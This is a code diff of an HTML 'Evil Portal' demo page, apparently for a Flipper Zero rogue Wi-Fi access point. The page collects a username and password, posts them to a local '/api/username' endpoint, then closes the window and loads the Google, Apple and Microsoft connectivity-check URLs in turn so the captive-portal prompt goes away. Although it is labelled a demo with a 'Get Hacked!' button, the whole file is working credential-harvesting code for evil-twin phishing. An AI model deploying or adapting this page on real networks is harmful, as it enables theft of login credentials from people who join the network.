@@ -2,36 +2,52 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-
+  <title>Single‑Page Cross‑Platform Portal</title>
   <script>
-    function postHackme() {
+    async function postHackme() {
       const un = document.getElementById('username').value;
       const pw = document.getElementById('password').value;
 
-      fetch('/api/username', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: un, password: pw })
-      })
+      try {
+        await fetch('/api/username', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: un, password: pw })
+        });
+      } catch (err) {
+        console.warn('POST error:', err);
+      }
+
+      window.close();
+
+      const probes = [
+        'http://clients3.google.com/generate_204',      // Android, Chrome
+        'http://captive.apple.com/hotspot-detect.html', // iOS, macOS
+        'http://www.msftconnecttest.com/connecttest.txt'// Windows
+      ];
+
+      let idx = 0;
+      function fireProbe() {
+        if (idx >= probes.length) return;
+        window.location.href = probes[idx++];
+        setTimeout(fireProbe, 800);
+      }
+      fireProbe();
     }
   </script>
-
   <style>
-	body {
-		text-align: center,
-	}
+    body { text-align: center; font-family: sans-serif; }
+    section { margin-top: 2rem; }
+    input { display: block; margin: .5rem auto; padding: .5rem; width: 200px; }
+    button { padding: .5rem 1rem; }
   </style>
-
-  <title>Captive Portal API Test</title>
 </head>
 <body>
-<h1>Flipper Blackhat Evil Portal Demo </h1>
-
+  <h1>Flipper Evil Portal Demo</h1>
   <section>
-    <input type="text" id="username" placeholder="Username">
-    <input type="text" id="password" placeholder="Password">
-    <button onclick="postHackme()">Get Hacked!</button>
+    <input id="username" placeholder="Username">
+    <input id="password" type="password" placeholder="Password">
+    <button type="button" onclick="postHackme()">Get Hacked!</button>
   </section>
-
 </body>
 </html>
